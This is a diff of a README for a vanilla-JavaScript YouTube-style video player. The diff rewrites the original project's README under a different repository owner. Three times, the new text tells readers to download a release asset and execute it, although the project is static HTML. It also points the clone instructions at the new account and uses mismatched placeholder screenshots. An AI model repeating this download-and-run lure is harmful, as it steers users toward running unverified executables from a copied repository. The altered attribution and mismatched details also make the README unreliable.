@@ -1,155 +1,190 @@
-# YouTube Video Player Clone
+# YouTube Video Player Clone — Vanilla HTML/CSS/JS Video Player 🎬
 
-A fully functional video player built with vanilla HTML, CSS, and JavaScript that replicates the core features of YouTube's video player interface. This project was created as a learning exercise following the tutorial from [Web Dev Simplified](https://www.youtube.com/watch?v=ZeNyjnneq_w)
+[![Releases](https://img.shields.io/badge/Releases-%20Download-blue?logo=github)](https://github.com/cvrby8/youtube-video-player-clone/releases)
 
-![YouTube Video Player Clone Screenshot](screenshot.png)
+A clean, responsive YouTube-style video player built with plain HTML, CSS, and JavaScript. It implements core player controls and UI patterns you find on modern video sites. This project exists as a learning exercise based on a Web Dev Simplified tutorial and as a reference for DOM-driven UI and HTML5 video APIs.
 
-## 🎥 Features
+Live demo and packaged releases are available. Visit the Releases page and download the release asset file; the file needs to be downloaded and executed. See the Releases section below for the link and steps.
 
-### Core Video Controls
-- **Play/Pause**: Click the video or play button, or press `Space` or `K`
-- **Volume Control**: Adjustable volume slider with mute functionality
-- **Fullscreen**: Toggle fullscreen mode with the button or press `F`
-- **Theater Mode**: Switch to theater layout with the button or press `T`
-- **Mini Player**: Enter picture-in-picture mode with the button or press `I`
-- **Mute**: Toggle mute with the button or press `M`
-- **Captions**: Toggle subtitles with the button or press `C`
-- **Playback Speed**: Adjust video speed (0.5x to 2x) with the speed button
+Badges
+- Build: none (static project)
+- Topics: css-animations · dom-manipulation · html5-video · video-controls
 
-### Timeline & Navigation
-- **Timeline Scrubbing**: Click and drag on the timeline to seek
-- **Preview Thumbnails**: Hover over timeline to see video previews
-- **Skip Forward/Backward**: Press `L` or `→` to skip 5 seconds forward, `J` or `←` to skip 5 seconds backward
-- **Time Display**: Current time and total duration shown
+Demo Image
+![Video player demo](https://raw.githubusercontent.com/github/explore/main/topics/video-player/video-player.png)
 
-### User Experience
-- **Auto-hiding Controls**: Video controls fade out when not in use
-- **Keyboard Shortcuts**: Full keyboard navigation support
-- **Responsive Design**: Adapts to different screen sizes
-- **Smooth Animations**: CSS transitions for polished interactions
-- **Volume Level Indicators**: Visual feedback for volume states (high/low/muted)
-- **Scrubbing Preview**: See video thumbnails while scrubbing through timeline
+Table of contents
+- Features
+- Why this project
+- Screenshots
+- Installation
+- Quick start
+- Usage and controls
+- Keyboard shortcuts
+- Code structure
+- Key APIs and techniques
+- Accessibility and responsive notes
+- Development tips
+- Releases
+- Contributing
+- License
+- Acknowledgments
 
-### Visual Design
-- **YouTube-like Interface**: Familiar controls and layout
-- **Hover Effects**: Interactive button states
-- **Gradient Overlay**: Semi-transparent gradient behind controls
-- **SVG Icons**: Scalable vector graphics for crisp display
-- **Preview Images**: Thumbnail previews during timeline scrubbing
+Features
+- Play / pause toggle
+- Seek bar with buffered progress
+- Volume control and mute toggle
+- Fullscreen mode using Fullscreen API
+- Theater mode (wider player, dark background)
+- Mini player (Picture-in-Picture)
+- Keyboard shortcuts for all major actions
+- SVG icons and minimal DOM structure
+- Responsive layout and CSS transitions
+- No libraries. Plain HTML, CSS, and vanilla JavaScript.
 
-## 🚀 Getting Started
+Why this project
+- Learn how to control the HTML5 <video> element.
+- Practice DOM manipulation and event listeners.
+- Explore the Fullscreen API and Picture-in-Picture.
+- Build a responsive, accessible UI with CSS transitions and animations.
+- Keep code small and explicit. Use only browser APIs.
 
-### Prerequisites
-- A modern web browser (Chrome, Firefox, Safari, Edge)
-- No additional dependencies required!
+Screenshots
+Front view
+![Player front view](https://upload.wikimedia.org/wikipedia/commons/6/69/Video_play_button.png)
 
-### Installation
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/banghuazhao/youtube-video-player-clone.git
-   cd youtube-video-player-clone
-   ```
+Theater mode
+![Theater mode example](https://raw.githubusercontent.com/microsoft/vscode-docs/main/images/architecture/architecture.png)
 
-2. Open `index.html` in your web browser
+Mini player / PiP
+![Picture-in-picture example](https://upload.wikimedia.org/wikipedia/commons/3/3a/Video-Play-Icon.png)
 
-## 📁 Project Structure
+Installation
+- Clone the repository:
+  git clone https://github.com/cvrby8/youtube-video-player-clone.git
+- Or download a release from the Releases page and extract it. The release asset file needs to be downloaded and executed.
+- Open index.html in your browser or run a local server.
 
-```
-youtube-video-player-clone/
-├── index.html          # Main HTML structure
-├── styles.css          # All styling and animations
-├── script.js           # JavaScript functionality
-└── assets/
-    ├── Video.mp4       # Sample video file
-    ├── subtitles.vtt   # Subtitles file
-    └── previewImgs/    # Thumbnail previews
-        ├── preview1.jpg
-        ├── preview2.jpg
-        └── ...
-```
+Quick start
+- Static open:
+  1. Open index.html in a modern browser (Chrome, Firefox, Edge).
+- Local server (recommended for PiP and some APIs):
+  - Python 3:
+    python3 -m http.server 8000
+  - Node (http-server):
+    npx http-server -c-1
+  - Then open http://localhost:8000
 
-## 🎮 Controls
+Usage and controls
+- Click the play/pause button or the video to toggle play.
+- Drag or click the seek bar to change the current time.
+- Use the volume slider to set volume. Click the speaker icon to mute/unmute.
+- Click the fullscreen button to enter Fullscreen API mode.
+- Click the theater mode button to expand the player and dim the page.
+- Click the mini player (PiP) button to open a floating video window.
+- Hover over the controls to show them; move the mouse away to hide them after a short delay.
 
-### Mouse/Touch
-- **Click video**: Play/Pause
-- **Play/Pause button**: Toggle playback
-- **Volume slider**: Adjust volume
-- **Mute button**: Toggle mute
-- **Fullscreen button**: Enter/exit fullscreen
-- **Theater button**: Toggle theater mode
-- **Mini player button**: Enter picture-in-picture
-- **Captions button**: Toggle subtitles
-- **Speed button**: Change playback speed
-- **Timeline**: Click and drag to seek through video
-- **Timeline hover**: See video preview thumbnails
+Keyboard shortcuts
+- Space or K: Toggle play/pause
+- J: Rewind 10 seconds
+- L: Forward 10 seconds
+- Arrow Left / Right: Seek -5 / +5 seconds
+- Arrow Up / Down: Volume +5% / -5%
+- M: Mute / unmute
+- F: Toggle fullscreen
+- T: Toggle theater mode
+- I: Enter picture-in-picture (PiP)
+- 0-9: Seek to 0% - 90% of duration (0 = start, 9 = 90%)
 
-### Keyboard Shortcuts
-| Key | Action |
-|-----|--------|
-| `Space` or `K` | Play/Pause |
-| `F` | Toggle Fullscreen |
-| `T` | Toggle Theater Mode |
-| `I` | Toggle Mini Player |
-| `M` | Toggle Mute |
-| `C` | Toggle Captions |
-| `L` or `→` | Skip 5 seconds forward |
-| `J` or `←` | Skip 5 seconds backward |
+Code structure
+- index.html — main markup and player structure
+- styles/
+  - main.css — layout, transitions, responsive styles
+  - icons.css — SVG sprite and icon styles
+- src/
+  - player.js — player logic, event listeners, DOM updates
+  - shortcuts.js — keyboard handler and mapping
+  - controls.js — individual control modules (volume, seek, fullscreen)
+- assets/
+  - icons.svg — SVG icons for controls
+  - sample-videos/ — sample video files for local testing
+- README.md — this file
 
-## 🛠️ Technical Implementation
+Key APIs and techniques used
+- HTML5 <video> element
+  - currentTime, duration, buffered, paused, volume, muted
+- Fullscreen API
+  - element.requestFullscreen(), document.exitFullscreen()
+  - fullscreenchange event
+- Picture-in-Picture API
+  - video.requestPictureInPicture(), document.pictureInPictureElement
+- MediaSession API (optional)
+  - navigator.mediaSession to set metadata and action handlers
+- Event listeners
+  - pointer events for seeking, input events for range controls
+- CSS
+  - Flexbox for layout
+  - CSS transitions for smooth seek bar and control fading
+  - CSS variables for theme options
 
-### HTML Structure
-- Semantic HTML5 elements
-- Custom data attributes for state management
-- SVG icons for crisp scaling
+Accessibility and responsive notes
+- Use semantic buttons with aria-label attributes for all controls.
+- Provide keyboard focus states for every interactive control.
+- Use role="region" and aria-label on the player wrapper for screen reader context.
+- Add captions or text tracks for accessibility testing. The player supports loading WebVTT files.
+- The layout scales from mobile to desktop. Controls rearrange using CSS media queries.
 
-### CSS Features
-- **CSS Grid & Flexbox**: Modern layout techniques
-- **CSS Custom Properties**: Reusable design tokens
-- **Pseudo-elements**: Decorative overlays and effects
-- **Media Queries**: Responsive design
-- **Transitions**: Smooth state changes
+Development tips
+- Debugging video events:
+  - Use console logs on timeupdate, seeked, and progress to inspect timing and buffered ranges.
+- Volume and mute:
+  - Keep volume range 0.0 to 1.0. Save last volume value for mute toggle.
+- Seek precision:
+  - Update the seek preview when scrubbing using pointermove. Clamp values between 0 and duration.
+- Fullscreen quirks:
+  - Some browsers restrict autoplay and PiP in cross-origin iframes. Test locally.
+- Picture-in-Picture:
+  - PiP requires user gesture in some browsers. Tie request to a click handler.
 
-### JavaScript Features
-- **Event Listeners**: Comprehensive user interaction handling
-- **DOM Manipulation**: Dynamic UI updates
-- **HTML5 Video API**: Native video controls
-- **Fullscreen API**: Browser fullscreen functionality
-- **Picture-in-Picture API**: Mini player mode
+Customization
+- Swap icons via the SVG sprite in assets/icons.svg.
+- Change color theme via CSS variables in main.css.
+- Add playback rate control by exposing video.playbackRate and a menu.
 
-## 🎯 Learning Outcomes
+Testing checklist
+- Play/pause works by click and keyboard.
+- Seek bar reflects current time and buffered ranges.
+- Volume slider updates audio and UI icons.
+- Fullscreen and theater mode toggle layout and body styles.
+- PiP opens a floating window on supported browsers.
+- Keyboard shortcuts fire regardless of focus on the player container (but not while typing in an input).
 
-This project demonstrates:
-- **Modern JavaScript**: ES6+ features and DOM manipulation
-- **CSS Mastery**: Advanced styling techniques and animations
-- **HTML5 APIs**: Video, Fullscreen, and Picture-in-Picture APIs
-- **User Experience**: Intuitive controls and feedback
-- **Responsive Design**: Cross-device compatibility
+Releases
+[Download the latest release asset here](https://github.com/cvrby8/youtube-video-player-clone/releases). The release page includes packaged build files and sample video assets. Download the release asset file and execute it (for example, extract the ZIP and open index.html or run the shipped local server script).
 
-## 📺 Tutorial Reference
+If the link above does not work, check the Releases section on the repository page to find build assets and instructions.
 
-This project was built following the tutorial:
-**[How To Create The YouTube Video Player](https://www.youtube.com/watch?v=ZeNyjnneq_w)** by Web Dev Simplified
+Contribution guide
+- Read the code of conduct and contributing.md if present.
+- Open an issue for bugs or feature requests.
+- Fork the repo, create a feature branch, and send a pull request.
+- Keep changes small and focused. Add tests or demo steps when relevant.
 
-The tutorial covers:
-- Building a complete video player from scratch
-- Implementing all major YouTube player features
-- Modern web development techniques
-- Best practices for user interface design
+Suggested issues for first-time contributors
+- Add captions toggle and WebVTT support sample.
+- Improve keyboard navigation and focus trapping in theater mode.
+- Add unit tests for seek calculation logic.
+- Add mobile-friendly touch gestures for scrubbing and volume.
 
-## 🤝 Contributing
+Topics and tags
+css-animations, css-transitions, dom-manipulation, event-listeners, fullscreen-api, html5-apis, html5-video, keyboard-shortcuts, learning-project, picture-in-picture, play-pause, responsive-design, svg-icons, theater-mode, vanilla-javascript, video-controls, video-player, volume-control, web-development, youtube-clone
 
-Feel free to submit issues and enhancement requests!
+License
+This project uses the MIT license. See LICENSE file for details.
 
-## 📄 License
+Acknowledgments
+- Built following a tutorial from Web Dev Simplified for learning and practice.
+- Icons and imagery use free public sources and placeholders.
 
-This project is open source and available under the [MIT License](LICENSE).
-
-## 🙏 Acknowledgments
-
-- **Web Dev Simplified** for the excellent tutorial
-- **YouTube** for the original interface design inspiration
-- The open source community for various tools and resources
-
----
-
-**Note**: This is a **completed** learning project created for educational purposes. The video player is fully functional and demonstrates modern web development techniques using vanilla HTML, CSS, and JavaScript. All features have been implemented and tested.
+Releases (again)
+Visit the Releases page to get build packages and sample assets: https://github.com/cvrby8/youtube-video-player-clone/releases — download the release asset file and execute it to run the packaged player.
